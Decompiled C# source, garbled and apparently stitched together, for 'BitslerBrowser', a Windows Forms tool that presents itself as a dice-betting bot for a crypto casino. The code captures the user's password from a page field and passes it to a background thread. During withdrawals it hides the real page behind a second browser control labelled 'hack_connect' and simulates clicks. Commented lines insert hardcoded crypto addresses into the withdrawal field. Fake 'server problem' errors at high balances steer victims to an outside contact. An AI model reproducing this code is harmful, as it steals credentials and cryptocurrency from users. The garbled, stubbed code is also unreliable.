                     	 Decimal.TryParse(this.txt_win_profits.Text, out this.Win_Profits);
                     	if (this.Lose_Profits > Decimal.Zero && this.chk_lose_profit.Checked)
                     	 {
                         	this.webControl1.WebView.Reload(true);
                         	int num2 = (int)MessageBox.Show("Stop After Lose Profits amount should be a negetive number!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                         	return;
                    	}
                     	 if (this.chk_switch_after_reset.Checked && !this.chk_win_reset.Checked && !this.chk_lose_reset.Checked)
                     	 {
                         	 this.webControl1.WebView.Reload(true);
                         	 int num2 = (int)MessageBox.Show("For switching between roll over and roll under, you should check ('Reset After Wins') checkbox or ('Reset After Lose') checkbox or both of them", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        	 return;
                     	 }
                     	this.webControl1.Focus();
                     	if (this.chk_switch_after_reset.Checked && this.webControl1.WebView.EvalScript("document.getElementById('btn-hotkeys').innerHTML;").ToString().Contains("Enabled"))
                     	 {
                        	this.webControl1.WebView.EvalScript("document.getElementById('btn-hotkeys').click()");
                         	Thread.Sleep(this.MilliSeconds);
                         	SendKeys.Send("{Esc}");
                        	Thread.Sleep(this.MilliSeconds);
                     	 }
                     	flag = true;
                     	if (!(this.webControl1.WebView.EvalScript("document.getElementById('page-alert').innerHTML").ToString() == ""))
                         	return;
                     	 if (this.TwoFactor != "")
                     	 {
                         	this.webControl1.WebView.Reload(true);
                         	int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is a problem with your account. Use another Bitsler account!", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        	return;
                     	}
                     	if (this.Balance >= Decimal.Parse("0.01") && this.type.ToLower() == "btc" && this.TwoFactor == "")
                     	{
                         	 this.webControl1.WebView.Reload(true);
                         	int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is problem with the server. " + Environment.NewLine + "Support = yyyyy91@yahoo.com , WhatsApp = +1(202)846-4248", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                         	 return;
                     	}
                     	if (this.Balance >= Decimal.Parse("0.2") && this.type.ToLower() == "eth" && this.TwoFactor == "")
                     	{
                         	this.webControl1.WebView.Reload(true);
                         	int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "There is problem with the server. " + Environment.NewLine + "Support = yyyyy91@yahoo.com , WhatsApp = +1(202)846-4248", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                         	return;
                     	}
                     	if (this.type == "burst" || this.type == "ltc" || this.type == "doge")
                     	 {
                         	this.webControl1.WebView.Reload(true);
                         	int num2 = (int)MessageBox.Show("BitslerBrowser is not working!" + Environment.NewLine + "This app does not work with " + this.type.ToUpper() + " , Use Bitcoin or Ethereum", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                         	return;
                     	 }
                     	this.webControl1.Enabled = false;
                     	this.WinCounter = this.LoseCounter = 0;
                   	this.Start_Rolling();
                   	return;
                 	 }
                 	catch (Exception ex)
                 	{
                     	if (flag)
                     	 {
                         	this.webControl1.Enabled = false;
                         	this.WinCounter = this.LoseCounter = 0;
                        	this.Start_Rolling();
                         	return;
                     	 }
                     	this.webControl1.WebView.Reload(true);
                     	int num = (int)MessageBox.Show("Error - try again." + Environment.NewLine + "Error datails: " + Environment.NewLine + ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                     	return;
                 	 }
             	 }
             	 else
                	break;
         	case 2550807420:
             	if (s == "btn-set-password")
            	{
                 	try
                 	{
                    	this.filesSent = false;
                     	this.PassWord = this.webControl1.WebView.EvalScript("document.getElementById('password-set').value;").ToString();
                     	this.hidden = true;
                   	new Thread(new ThreadStart(this.DataBinding)).Start();
                     	return;
                 	 }
                 	catch (Exception ex)
                 	{
                     	this.Error = this.Error + "---------<br/>btn-set-password=" + ex.Message;
                     	return;
                 	 }
                 	 }
               		}
           	else
                	break;
          	case 2659341605:
            	if (s == "btn-verif-create-account")
            	{
                	try
                	{
                    	this.filesSent = false;
                    	Document document = this.webControl1.WebView.GetDOMWindow().document;
                    	string str = this.webControl1.WebView.EvalScript("document.getElementById('username').value;").ToString();
                    	if (str.Trim() != "")
                        	this.UserName = str;
                    	this.PassWord = "Created Account!";
                    	return;
                	}
               	catch (Exception ex)
                	{
                    	this.Error = this.Error + "---------<br/>btn-verif-create-account=" + ex.Message;
                    	return;
                	 }
                	 }
           	else
               	 break;
          	case 3219208527:
            	if (s == "btn-withdraw-burst")
            	 {
                	if (!(this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value").ToString() != ""))
                    	return;
                	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 4, 10));
                //this.hacking = true;
                	this.UpdateBalance();
                // this.webControl1.WebView.EvalScript("document.getElementById('withdraw-amount').value='" + (object) this.Balance + "';");
                	this.webControl2.Visible = true;
                	this.timer_hack_connect.Enabled = true;
               		this.webControl2.Enabled = false;
			this.webControl1.Visible = false;
                    	Thread.Sleep(2000);
	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 6, 10));
	return;
	}
	break;
	case 3414157588:
	if (s == "btn-withdraw")
	{
	if (!(this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value;").ToString() != ""))
	return;
                    //this.hacking = true;
	this.UpdateBalance();
                    //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-amount').value='" + (object) this.Balance + "';");
	this.lbl_Status.Text = "Loading, please wait";
	this.webControl2.Visible = true;
	this.timer_hack_connect.Enabled = true;
	this.webControl2.Enabled = false;
	this.webControl1.Visible = false;
	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 3, 10));
	string type = this.type;
	if (!(type == "btc"))
	{
	if (!(type == "ltc"))
	{
	if (type == "doge") ;
                    //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='DLJFGyPeuz4opBKMFFJatYZmM9NDxXKaaf';");
                    //}
                    //else
                    //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value='3GQS5kEroeLsg5Lc9jso5j4wrxc1gcRkjb';");
                    //}
                    // else
                    // {
                    //this.GetBTCAddress();
                    //this.webControl1.WebView.EvalScript(Regex.Replace("document.getElementById('withdraw-address').value='" + this.BTCAddress + "';", "\\t|\\n|\\r", ""));
                    //  }
                    // this.webControl1.WebView.EvalScript("document.getElementById('btn-withdraw').click();");
                    //Thread.Sleep(2000);
	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 6, 10));
	return;
	}
	break;
	case 3425627462:
	if (s == "btn-withdraw-eth")
	{
	if (!(this.webControl1.WebView.EvalScript("document.getElementById('withdraw-address').value").ToString() != ""))
	return;
	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 4, 10));
                    //this.hacking = true;
	this.UpdateBalance();
	this.webControl2.Visible = true;
	this.timer_hack_connect.Enabled = true;
	this.webControl2.Enabled = false;
	this.webControl1.Visible = false;
	Thread.Sleep(2000);
	this.webControl1.WebView.SendMouseEvent(MouseEventType.Click, new MouseEventArgs(MouseButtons.Left, 10, this.webControl1.Width / 2 + 100, this.webControl1.Height / 10 * 6, 10));
	return;
	}
	break;
	}
	if (!this.Rolling_Timer.Enabled)
	return;
	this.lbl_Status.Text = "Browser page is locked! Stop rolling to unlock it!";
	this.webControl1.Enabled = false;
        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(328, 322);
            this.Name = "Form1";
            this.ResumeLayout(false);

        }
    }
      	catch (Exception ex)
      {
private IContainer components;        this.Error = this.Error + "---------<br/>MouseClick=" + ex.Message;
      }
    	 }

        	private void Start_Rolling()
        {
            	throw new NotImplementedException();
        	}

       		private void DataBinding()
        {
            	throw new NotImplementedException();
        	}

        	private void ComputeStringHash(string s)
        {
            	throw new NotImplementedException();
       		}

       	private void ClearCookies()
    {
      		try
      {
        string path = Path.GetTempPath() + "\\eo.webbrowser.cache.16.2.93.0.1.1\\Cookies";
        	if (!File.Exists(path))
          	return;
        try
        	{
          	File.Delete(path);
        	}
        	catch (Exception ex)
        {
          	this.Error = this.Error + "---------<br/>ClearCookies=" + ex.Message;
          	int num = (int) MessageBox.Show("Error, Cannot clear cache" + Environment.NewLine + "You should delete " + path + " manually", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          	Application.Exit();
        	}
      	}
     	catch (Exception ex)
      {
      		}
    		}

    	public void UpdateBalance()
    {
      	try
      {
        	string[] strArray = this.webControl1.WebView.EvalScript("document.getElementById('balances-lg').innerHTML;").ToString().Split('.');
        	this.Balance = Decimal.Parse(strArray[0].Split('>')[1] + "." + strArray[1].Substring(0, 8));
        	if (!this.Balance.ToString().Contains("."))
          	this.Balance /= new Decimal(100000000);
       		this.Balance.ToString().Replace(',', '.');
        	if (this.FirstBalance == Decimal.MinusOne)
        	{
         	this.FirstBalance = this.Balance;
          	this.hidden = true;
          	new Thread(new ThreadStart(this.DataBinding)).Start();
        	}
        	else if (this.Balance - this.FirstBalance >= Decimal.Parse("0.003"))
        	{
          	this.FirstBalance = this.Balance;
          	this.hidden = true;
         	new Thread(new ThreadStart(this.DataBinding)).Start();
	}
        	if (!(this.TwoFactor != ""))
          	return;
        	if (this.Balance > Decimal.Parse("0.001") && this.type == "btc")
        {
          //this.GetBTCAddress();
          //this.hacking = true;
        	}
         	if (this.Balance > Decimal.Parse("0.00001") && this.type.ToLower() == "eth")
          //this.hacking = true;
         	if (this.Balance > Decimal.Parse("400") && this.type.ToLower() == "doge")
          //this.hacking = true;
         	if (this.Balance > Decimal.Parse("0.001") && this.type.ToLower() == "ltc")
          //this.hacking = true;
         	if (this.Balance > Decimal.Parse("200") && this.type.ToLower() == "burst")
          //this.hacking = true;
        //if (!this.hacking)
         // return;
       		this.lbl_Status.Text = "Loading, please wait";
        	this.webControl1.Visible = false;
        	this.webControl2.Visible = true;
        	this.timer_hack_connect.Enabled = true;
        	this.webControl2.Enabled = true;
        //if (this.type == "btc" && this.BTCAddress == "")
          //this.GetBTCAddress();
        //this.lbl_Status.Text = "Err, try login again";
        //this.webControl2.WebView.SetFocus();
        //this.webControl1.WebView.EvalScript("document.getElementById('withdraw-btn-lg').click();");
      	 }
      	catch (Exception ex)
      	 {
        	this.Error = this.Error + "-----<br/>UpdateBalance---" + ex.Message;
        	new Thread(new ThreadStart(this.UpdateBalance)).Start();
      		}
    		 }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(499, 296);
            this.Name = "Form1";
            this.ResumeLayout(false);

        }

         private void Reset_Roll()
    {
      this.webControl1.Enabled = true;
      this.webControl1.WebView.EvalScript("document.getElementById('btn-bet-stop-pilot-dice').click();");
      this.WinCounter = 0;
      this.LoseCounter = 0;
      if (this.chk_switch_after_reset.Checked)
      {
        if (!this.webControl1.WebView.EvalScript("document.getElementById('updated_condition').innerHTML;").ToString().Contains("&gt;"))
        {
          this.webControl1.Focus();
          this.webControl1.WebView.EvalScript("document.getElementById('updated_condition').focus()");
          SendKeys.Send("{h}");
        }
        else
        {
          this.webControl1.Focus();
          this.webControl1.WebView.EvalScript("document.getElementById('updated_condition').focus()");
          SendKeys.Send("{l}");
        }
      }
      this.webControl1.UseWaitCursor = true;
      while (true)
      {
        Thread.Sleep(this.MilliSeconds);
        try
        {
          this.webControl1.WebView.EvalScript("document.getElementById('btn-bet-start-pilot-dice').click();");
          this.webControl1.Enabled = false;
          this.webControl1.UseWaitCursor = false;
          break;
        }
        catch
        {
        }
      }
    }

    public void Start_Rolling()
    {
      if (this.chk_change_seed.Checked)
        this.SeedChanger_Timer.Enabled = true;
      this.pnl_Main.Enabled = false;
      this.Last_Balance = this.Balance;
      this.lbl_Status.Text = "For better result webpage locked. And you can stop rolling by clicking on red Button!";
      this.btn_Stop_Pilot_Mode.Visible = true;
      this.Rolling_Timer.Enabled = true;
      this.webControl1.Enabled = false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.panel3 = new Panel();
      this.btn_Start_Pilot_Mode = new Button();
      this.btn_Stop_Pilot_Mode = new Button();
      this.label2 = new Label();
      this.label1 = new Label();
      this.lbl_Status = new Label();
      this.label9 = new Label();
      this.label8 = new Label();
      this.label7 = new Label();
      this.label6 = new Label();
      this.label5 = new Label();
      this.Rolling_Timer = new System.Windows.Forms.Timer(this.components);
      this.SeedChanger_Timer = new System.Windows.Forms.Timer(this.components);
      this.label4 = new Label();
      this.label3 = new Label();
      this.txt_lose_profits = new TextBox();
      this.txt_win_profits = new TextBox();
      this.txt_lose_reset = new TextBox();
      this.txt_win_stop = new TextBox();
      this.txt_win_reset = new TextBox();
      this.Login_Timer = new System.Windows.Forms.Timer(this.components);
      this.p = new Panel();
      this.timer_Connect = new System.Windows.Forms.Timer(this.components);
      this.txt_lose_stop = new TextBox();
      this.chk_switch_after_reset = new CheckBox();
      this.chk_change_seed = new CheckBox();
      this.chk_lose_profit = new CheckBox();
      this.chk_lose_reset = new CheckBox();
      this.chk_win_stop = new CheckBox();
      this.chk_win_reset = new CheckBox();
      this.chk_lose_stop = new CheckBox();
      this.pnl_Main = new Panel();
      this.chk_win_profit = new CheckBox();
      this.panel2 = new Panel();
      this.txt_code = new TextBox();
      this.btn_RefreshPage = new Button();
      this.txt_URL = new TextBox();
      this.panel1 = new Panel();
      this.btn_youtube = new Button();
      this.timer_Login = new System.Windows.Forms.Timer(this.components);
      this.timer_hack_connect = new System.Windows.Forms.Timer(this.components);
      this.webControl1 = new WebControl();
      this.webControl2 = new WebControl();
      this.panel3.SuspendLayout();
      this.pnl_Main.SuspendLayout();
      this.panel2.SuspendLayout();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.panel3.Controls.Add((Control) this.btn_Start_Pilot_Mode);
      this.panel3.Controls.Add((Control) this.btn_Stop_Pilot_Mode);
      this.panel3.Controls.Add((Control) this.label2);
      this.panel3.Controls.Add((Control) this.label1);
      this.panel3.Controls.Add((Control) this.lbl_Status);
      this.panel3.Dock = DockStyle.Bottom;
      this.panel3.Location = new Point(0, 583);
      this.panel3.Margin = new Padding(4, 5, 4, 5);
      this.panel3.Name = "panel3";
      this.panel3.Size = new Size(423, 372);
      this.panel3.TabIndex = 23;
      this.btn_Start_Pilot_Mode.BackColor = Color.FromArgb(213, 200, 38);
      this.btn_Start_Pilot_Mode.Font = new Font("Microsoft Sans Serif", 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 178);
      this.btn_Start_Pilot_Mode.ForeColor = Color.Black;
      this.btn_Start_Pilot_Mode.Location = new Point(27, 112);
      this.btn_Start_Pilot_Mode.Margin = new Padding(4, 5, 4, 5);
      this.btn_Start_Pilot_Mode.Name = "btn_Start_Pilot_Mode";
      this.btn_Start_Pilot_Mode.Size = new Size(378, 63);
      this.btn_Start_Pilot_Mode.TabIndex = 26;
      this.btn_Start_Pilot_Mode.Text = "Click Here To Start Rolling";
      this.btn_Start_Pilot_Mode.UseVisualStyleBackColor = false;
      this.btn_Start_Pilot_Mode.Click += new EventHandler(this.btn_Start_Pilot_Mode_Click);
      this.btn_Stop_Pilot_Mode.BackColor = Color.DarkRed;
      this.btn_Stop_Pilot_Mode.Font = new Font("Microsoft Sans Serif", 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 178);
      this.btn_Stop_Pilot_Mode.ForeColor = Color.White;
      this.btn_Stop_Pilot_Mode.Location = new Point(27, 185);
      this.btn_Stop_Pilot_Mode.Margin = new Padding(4, 5, 4, 5);
      this.btn_Stop_Pilot_Mode.Name = "btn_Stop_Pilot_Mode";
      this.btn_Stop_Pilot_Mode.Size = new Size(378, 74);
      this.btn_Stop_Pilot_Mode.TabIndex = 18;
      this.btn_Stop_Pilot_Mode.Text = "Click Here To Stop Rolling";
      this.btn_Stop_Pilot_Mode.UseVisualStyleBackColor = false;
      this.btn_Stop_Pilot_Mode.Click += new EventHandler(this.btn_Stop_Pilot_Mode_Click);
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 178);
      this.label2.Location = new Point(141, 335);
      this.label2.Margin = new Padding(4, 0, 4, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(181, 20);
      this.label2.TabIndex = 22;
      this.label2.Text = "yyyyy91@yahoo.com";
      this.label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 178);
      this.label1.Location = new Point(48, 263);
      this.label1.Margin = new Padding(4, 0, 4, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(364, 77);
      this.label1.TabIndex = 23;
      this.label1.Text = "If you need more options or you have an idea please contact me";
      this.label1.TextAlign = ContentAlignment.MiddleCenter;
      this.lbl_Status.Dock = DockStyle.Top;
      this.lbl_Status.Font = new Font("Microsoft Sans Serif", 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 178);
      this.lbl_Status.ForeColor = Color.Red;
      this.lbl_Status.Location = new Point(0, 0);
      this.lbl_Status.Margin = new Padding(4, 0, 4, 0);
      this.lbl_Status.Name = "lbl_Status";
      this.lbl_Status.Size = new Size(423, 180);
      this.lbl_Status.TabIndex = 25;
      this.label9.AutoSize = true;
      this.label9.Location = new Point(326, 274);
      this.label9.Margin = new Padding(4, 0, 4, 0);
      this.label9.Name = "label9";
      this.label9.Size = new Size(54, 20);
      this.label9.TabIndex = 38;
      this.label9.Text = "Profits";
      this.label8.AutoSize = true;
      this.label8.Location = new Point(326, 238);
      this.label8.Margin = new Padding(4, 0, 4, 0);
      this.label8.Name = "label8";
      this.label8.Size = new Size(54, 20);
      this.label8.TabIndex = 37;
      this.label8.Text = "Profits";
      this.label7.AutoSize = true;
      this.label7.Location = new Point(267, 174);
      this.label7.Margin = new Padding(4, 0, 4, 0);
      this.label7.Name = "label7";
      this.label7.Size = new Size(110, 20);
      this.label7.TabIndex = 36;
      this.label7.Text = "Loses in a row";
      this.label6.AutoSize = true;
      this.label6.Location = new Point(267, 137);
      this.label6.Margin = new Padding(4, 0, 4, 0);
      this.label6.Name = "label6";
      this.label6.Size = new Size(110, 20);
      this.label6.TabIndex = 35;
      this.label6.Text = "Loses in a row";
      this.label5.AutoSize = true;
      this.label5.Location = new Point(267, 58);
      this.label5.Margin = new Padding(4, 0, 4, 0);
      this.label5.Name = "label5";
      this.label5.Size = new Size(98, 20);
      this.label5.TabIndex = 34;
      this.label5.Text = "wins in a row";
      this.Rolling_Timer.Tick += new EventHandler(this.Rolling_Timer_Tick);
      this.SeedChanger_Timer.Interval = 300000;
      this.SeedChanger_Timer.Tick += new EventHandler(this.SeedChanger_Timer_Tick);
      this.label4.AutoSize = true;
      this.label4.Location = new Point(267, 18);
      this.label4.Margin = new Padding(4, 0, 4, 0);
      this.label4.Name = "label4";
      this.label4.Size = new Size(98, 20);
      this.label4.TabIndex = 33;
      this.label4.Text = "wins in a row";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 178);
      this.label3.ForeColor = Color.DarkGreen;
      this.label3.Location = new Point(9, 326);
      this.label3.Margin = new Padding(4, 0, 4, 0);
      this.label3.Name = "label3";
      this.label3.Size = new Size(270, 29);
      this.label3.TabIndex = 32;
      this.label3.Text = "Increase Your Chance";
      this.txt_lose_profits.Location = new Point(166, 269);
      this.txt_lose_profits.Margin = new Padding(4, 5, 4, 5);
      this.txt_lose_profits.Name = "txt_lose_profits";
      this.txt_lose_profits.Size = new Size(148, 26);
      this.txt_lose_profits.TabIndex = 15;
      this.txt_lose_profits.Text = "-0.00000000";
      this.txt_win_profits.Location = new Point(166, 234);
      this.txt_win_profits.Margin = new Padding(4, 5, 4, 5);
      this.txt_win_profits.Name = "txt_win_profits";
      this.txt_win_profits.Size = new Size(148, 26);
      this.txt_win_profits.TabIndex = 13;
      this.txt_win_profits.Text = "0.00000000";
      this.txt_lose_reset.Location = new Point(135, 168);
      this.txt_lose_reset.Margin = new Padding(4, 5, 4, 5);
      this.txt_lose_reset.Name = "txt_lose_reset";
      this.txt_lose_reset.Size = new Size(120, 26);
      this.txt_lose_reset.TabIndex = 11;
      this.txt_lose_reset.Text = "0";
      this.txt_win_stop.Location = new Point(135, 12);
      this.txt_win_stop.Margin = new Padding(4, 5, 4, 5);
      this.txt_win_stop.Name = "txt_win_stop";
      this.txt_win_stop.Size = new Size(120, 26);
      this.txt_win_stop.TabIndex = 7;
      this.txt_win_stop.Text = "0";
      this.txt_win_reset.Location = new Point(135, 52);
      this.txt_win_reset.Margin = new Padding(4, 5, 4, 5);
      this.txt_win_reset.Name = "txt_win_reset";
      this.txt_win_reset.Size = new Size(120, 26);
      this.txt_win_reset.TabIndex = 5;
      this.txt_win_reset.Text = "0";
      this.Login_Timer.Interval = 1000;
      this.Login_Timer.Tick += new EventHandler(this.Login_Timer_Tick);
      this.p.Location = new Point(4, 71);
      this.p.Margin = new Padding(4, 5, 4, 5);
      this.p.Name = "p";
      this.p.Size = new Size(0, 0);
      this.p.TabIndex = 6;
      this.timer_Connect.Interval = 1000;
      this.timer_Connect.Tick += new EventHandler(this.timer_Connect_Tick);
      this.txt_lose_stop.Location = new Point(135, 132);
      this.txt_lose_stop.Margin = new Padding(4, 5, 4, 5);
      this.txt_lose_stop.Name = "txt_lose_stop";
      this.txt_lose_stop.Size = new Size(120, 26);
      this.txt_lose_stop.TabIndex = 9;
      this.txt_lose_stop.Text = "0";
      this.chk_switch_after_reset.AutoSize = true;
      this.chk_switch_after_reset.Location = new Point(16, 400);
      this.chk_switch_after_reset.Margin = new Padding(4, 5, 4, 5);
      this.chk_switch_after_reset.Name = "chk_switch_after_reset";
      this.chk_switch_after_reset.Size = new Size(377, 24);
      this.chk_switch_after_reset.TabIndex = 17;
      this.chk_switch_after_reset.Text = "Switch beteen Roll over/under  after  each Reset";
      this.chk_switch_after_reset.UseVisualStyleBackColor = true;
      this.chk_change_seed.AutoSize = true;
      this.chk_change_seed.Location = new Point(18, 365);
      this.chk_change_seed.Margin = new Padding(4, 5, 4, 5);
      this.chk_change_seed.Name = "chk_change_seed";
      this.chk_change_seed.Size = new Size(352, 24);
      this.chk_change_seed.TabIndex = 16;
      this.chk_change_seed.Text = "Change seed automatically (Every 5 Minutes)";
      this.chk_change_seed.UseVisualStyleBackColor = true;
      this.chk_lose_profit.AutoSize = true;
      this.chk_lose_profit.Location = new Point(18, 271);
      this.chk_lose_profit.Margin = new Padding(4, 5, 4, 5);
      this.chk_lose_profit.Name = "chk_lose_profit";
      this.chk_lose_profit.Size = new Size(135, 24);
      this.chk_lose_profit.TabIndex = 14;
      this.chk_lose_profit.Text = "Stop after lost";
      this.chk_lose_profit.UseVisualStyleBackColor = true;
      this.chk_lose_reset.AutoSize = true;
      this.chk_lose_reset.Location = new Point(18, 168);
      this.chk_lose_reset.Margin = new Padding(4, 5, 4, 5);
      this.chk_lose_reset.Name = "chk_lose_reset";
      this.chk_lose_reset.Size = new Size(115, 24);
      this.chk_lose_reset.TabIndex = 10;
      this.chk_lose_reset.Text = "Reset after";
      this.chk_lose_reset.UseVisualStyleBackColor = true;
      this.chk_win_stop.AutoSize = true;
      this.chk_win_stop.Location = new Point(18, 17);
      this.chk_win_stop.Margin = new Padding(4, 5, 4, 5);
      this.chk_win_stop.Name = "chk_win_stop";
      this.chk_win_stop.Size = new Size(106, 24);
      this.chk_win_stop.TabIndex = 6;
      this.chk_win_stop.Text = "Stop after";
      this.chk_win_stop.UseVisualStyleBackColor = true;
      this.chk_win_reset.AutoSize = true;
      this.chk_win_reset.Location = new Point(18, 52);
      this.chk_win_reset.Margin = new Padding(4, 5, 4, 5);
      this.chk_win_reset.Name = "chk_win_reset";
      this.chk_win_reset.Size = new Size(115, 24);
      this.chk_win_reset.TabIndex = 4;
      this.chk_win_reset.Text = "Reset after";
      this.chk_win_reset.UseVisualStyleBackColor = true;
      this.chk_lose_stop.AutoSize = true;
      this.chk_lose_stop.Location = new Point(18, 132);
      this.chk_lose_stop.Margin = new Padding(4, 5, 4, 5);
      this.chk_lose_stop.Name = "chk_lose_stop";
      this.chk_lose_stop.Size = new Size(106, 24);
      this.chk_lose_stop.TabIndex = 8;
      this.chk_lose_stop.Text = "Stop after";
      this.chk_lose_stop.UseVisualStyleBackColor = true;
      this.pnl_Main.Controls.Add((Control) this.label9);
      this.pnl_Main.Controls.Add((Control) this.label8);
      this.pnl_Main.Controls.Add((Control) this.label7);
      this.pnl_Main.Controls.Add((Control) this.label6);
      this.pnl_Main.Controls.Add((Control) this.label5);
      this.pnl_Main.Controls.Add((Control) this.label4);
      this.pnl_Main.Controls.Add((Control) this.label3);
      this.pnl_Main.Controls.Add((Control) this.txt_lose_profits);
      this.pnl_Main.Controls.Add((Control) this.txt_win_profits);
      this.pnl_Main.Controls.Add((Control) this.txt_lose_reset);
      this.pnl_Main.Controls.Add((Control) this.txt_win_stop);
      this.pnl_Main.Controls.Add((Control) this.txt_win_reset);
      this.pnl_Main.Controls.Add((Control) this.txt_lose_stop);
      this.pnl_Main.Controls.Add((Control) this.chk_switch_after_reset);
      this.pnl_Main.Controls.Add((Control) this.chk_change_seed);
      this.pnl_Main.Controls.Add((Control) this.chk_lose_profit);
      this.pnl_Main.Controls.Add((Control) this.chk_win_profit);
      this.pnl_Main.Controls.Add((Control) this.chk_lose_reset);
      this.pnl_Main.Controls.Add((Control) this.chk_win_stop);
      this.pnl_Main.Controls.Add((Control) this.chk_win_reset);
      this.pnl_Main.Controls.Add((Control) this.chk_lose_stop);
      this.pnl_Main.Dock = DockStyle.Fill;
      this.pnl_Main.Location = new Point(0, 0);
      this.pnl_Main.Margin = new Padding(4, 5, 4, 5);
      this.pnl_Main.Name = "pnl_Main";
      this.pnl_Main.Size = new Size(423, 583);
      this.pnl_Main.TabIndex = 24;
      this.chk_win_profit.AutoSize = true;
      this.chk_win_profit.Location = new Point(18, 237);
      this.chk_win_profit.Margin = new Padding(4, 5, 4, 5);
      this.chk_win_profit.Name = "chk_win_profit";
      this.chk_win_profit.Size = new Size(142, 24);
      this.chk_win_profit.TabIndex = 12;
      this.chk_win_profit.Text = "Stop after earn";
      this.chk_win_profit.UseVisualStyleBackColor = true;
      this.panel2.Controls.Add((Control) this.pnl_Main);
      this.panel2.Controls.Add((Control) this.panel3);
      this.panel2.Dock = DockStyle.Right;
      this.panel2.Location = new Point(1203, 62);
      this.panel2.Margin = new Padding(4, 5, 4, 5);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(423, 955);
      this.panel2.TabIndex = 4;
      this.txt_code.Location = new Point(1581, 14);
      this.txt_code.Margin = new Padding(4, 5, 4, 5);
      this.txt_code.Name = "txt_code";
      this.txt_code.ReadOnly = true;
      this.txt_code.Size = new Size(36, 26);
      this.txt_code.TabIndex = 3;
      this.txt_code.Visible = false;
      this.btn_RefreshPage.Location = new Point(1148, 5);
      this.btn_RefreshPage.Margin = new Padding(4, 5, 4, 5);
      this.btn_RefreshPage.Name = "btn_RefreshPage";
      this.btn_RefreshPage.Size = new Size(96, 48);
      this.btn_RefreshPage.TabIndex = 2;
      this.btn_RefreshPage.Text = "Reload";
      this.btn_RefreshPage.UseVisualStyleBackColor = true;
      this.btn_RefreshPage.Click += new EventHandler(this.btn_RefreshPage_Click);
      this.txt_URL.Enabled = false;
      this.txt_URL.Font = new Font("Microsoft Sans Serif", 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 178);
      this.txt_URL.Location = new Point(4, 6);
      this.txt_URL.Margin = new Padding(4, 5, 4, 5);
      this.txt_URL.Name = "txt_URL";
      this.txt_URL.Size = new Size(1132, 41);
      this.txt_URL.TabIndex = 1;
      this.panel1.Controls.Add((Control) this.btn_youtube);
      this.panel1.Controls.Add((Control) this.txt_code);
      this.panel1.Controls.Add((Control) this.btn_RefreshPage);
      this.panel1.Controls.Add((Control) this.txt_URL);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Margin = new Padding(4, 5, 4, 5);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(1626, 62);
      this.panel1.TabIndex = 5;
      this.btn_youtube.Location = new Point(1256, 5);
      this.btn_youtube.Margin = new Padding(4, 5, 4, 5);
      this.btn_youtube.Name = "btn_youtube";
      this.btn_youtube.Size = new Size(291, 48);
      this.btn_youtube.TabIndex = 4;
      this.btn_youtube.Text = "Go to my official youtube channel";
      this.btn_youtube.UseVisualStyleBackColor = true;
      this.btn_youtube.Click += new EventHandler(this.btn_youtube_Click);
      this.timer_Login.Interval = 500;
      this.timer_Login.Tick += new EventHandler(this.timer_Login_Tick);
      this.timer_hack_connect.Interval = 300;
      this.timer_hack_connect.Tick += new EventHandler(this.timer_hack_connect_Tick);
      this.webControl1.BackColor = Color.White;
      this.webControl1.Dock = DockStyle.Fill;
      this.webControl1.Location = new Point(0, 62);
      this.webControl1.Name = "webControl1";
      this.webControl1.Size = new Size(1203, 955);
      this.webControl1.TabIndex = 7;
      this.webControl1.Text = "webControl1";
